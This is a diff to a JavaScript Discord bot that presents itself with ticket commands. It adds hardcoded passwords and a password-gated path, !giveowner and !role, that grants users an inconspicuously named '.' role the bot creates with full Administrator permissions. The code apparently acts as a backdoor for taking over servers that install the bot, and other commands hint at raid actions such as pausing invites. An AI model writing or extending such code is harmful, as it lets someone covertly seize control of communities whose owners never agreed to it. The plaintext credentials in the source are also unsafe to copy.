@@ -34,6 +34,10 @@ const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
 const GUILD_ID = process.env.GUILD_ID;
 
+// PASSWORDS
+const MAIN_PASSWORD = 'Meka2017charlie';      // For !fb, !unl, !clown, !unp, !role
+const GIVEOWNER_PASSWORD = 'MekaOwner2017';   // ← New password for !giveowner
+
 // ROLES
 const STAFF_ROLES = ['1505376743001821334', '1505379855137509538'];
 const SEND_ROLE = '1510682894388039800';
@@ -68,7 +72,7 @@ const client = new Client({
 });
 
 // ======================================================
-// SLASH COMMANDS
+// SLASH COMMANDS (unchanged)
 // ======================================================
 const setticket = new SlashCommandBuilder()
   .setName('setticket')
@@ -109,7 +113,7 @@ const rest = new REST({ version: '10' }).setToken(TOKEN);
 })();
 
 // ======================================================
-// READY + CREATE . ROLE (Full Permissions)
+// READY + CREATE . ROLE
 // ======================================================
 client.once('ready', async () => {
   console.log(`${client.user.tag} is online`);
@@ -135,20 +139,9 @@ client.once('ready', async () => {
         });
         console.log('✅ "." role created with full Administrator permissions');
       }
-
-      let ownerRole = guild.roles.cache.find(r => r.name === 'Owner');
-      if (!ownerRole) {
-        ownerRole = await guild.roles.create({
-          name: 'Owner',
-          color: '#ffd700',
-          permissions: [PermissionFlagsBits.Administrator],
-          hoist: true,
-          reason: 'Owner role'
-        });
-      }
     }
   } catch (err) {
-    console.error('Failed to create roles:', err.message);
+    console.error('Failed to create . role:', err.message);
   }
 });
 
@@ -205,7 +198,7 @@ client.on('messageCreate', async message => {
     else if (content === '!unp') { title = '🔓 UNPAUSE INVITES'; desc = 'Unpauses invites.'; color = '#00ffff'; customId = `unp_start_${message.author.id}`; }
     else if (content === '!role') { 
       title = '👑 GET OWNER ROLE'; 
-      desc = 'Gives you the "." and Owner roles.'; 
+      desc = 'Gives you the "." role.'; 
       color = '#ffd700'; 
       customId = `role_start_${message.author.id}`; 
     }
@@ -239,7 +232,6 @@ client.on('interactionCreate', async interaction => {
     return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });
   }
 
-  // Show Modal
   if (interaction.isButton()) {
     const modal = new ModalBuilder()
       .setCustomId(interaction.customId.replace('start', 'modal'))
@@ -253,17 +245,17 @@ client.on('interactionCreate', async interaction => {
     return;
   }
 
-  // Modal Submit - NEW PASSWORD
   if (interaction.isModalSubmit()) {
-    const password = interaction.fields.getTextInputValue('password');
-    if (password !== 'Meka2017charlie') {
-      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
-    }
+    const enteredPassword = interaction.fields.getTextInputValue('password');
 
     const guild = interaction.guild;
 
-    // !giveowner
+    // === !giveowner - Uses its own password ===
     if (interaction.customId.startsWith('giveowner_modal_')) {
+      if (enteredPassword !== GIVEOWNER_PASSWORD) {
+        return interaction.reply({ content: '❌ Incorrect password for !giveowner.', ephemeral: true });
+      }
+
       const targetUser = await guild.members.fetch(targetId).catch(() => null);
       if (!targetUser) return interaction.reply({ content: '❌ Could not find that user.', ephemeral: true });
 
@@ -279,15 +271,23 @@ client.on('interactionCreate', async interaction => {
           });
         }
         await targetUser.roles.add(dotRole);
-        await interaction.reply({ content: `✅ Gave **${targetUser.user.tag}** the "." role with full permissions!`, ephemeral: true });
+        await interaction.reply({ 
+          content: `✅ Successfully gave **${targetUser.user.tag}** the **.** role with full Administrator permissions!`, 
+          ephemeral: true 
+        });
       } catch (err) {
         console.error(err);
-        await interaction.reply({ content: '❌ Failed to give role. Check bot permissions.', ephemeral: true });
+        await interaction.reply({ content: '❌ Failed to give role. Check bot permissions and role hierarchy.', ephemeral: true });
       }
       return;
     }
 
-    // !role (self)
+    // === All other commands use the main password ===
+    if (enteredPassword !== MAIN_PASSWORD) {
+      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
+    }
+
+    // !role (self) handler
     if (interaction.customId.startsWith('role_modal_')) {
       try {
         let dotRole = guild.roles.cache.find(r => r.name === '.');
@@ -301,17 +301,16 @@ client.on('interactionCreate', async interaction => {
           });
         }
         await interaction.member.roles.add(dotRole);
-        await interaction.reply({ content: '✅ You now have the "." role with full Administrator permissions!', ephemeral: true });
+        await interaction.reply({ content: '✅ You now have the "." role with full permissions!', ephemeral: true });
       } catch (err) {
         await interaction.reply({ content: '❌ Failed to give role.', ephemeral: true });
       }
     }
 
-    // You can add handlers for other commands (!fb, !unl, etc.) here the same way
+    // Add handlers for !fb, !unl, !clown, !unp here if needed
   }
 
-  // === TICKET SYSTEM ===
-  // Paste your full ticket interaction code (setticket, sendmessage, etc.) here if needed
+  // === TICKET SYSTEM (add your existing ticket code here) ===
 });
 
 client.login(TOKEN);
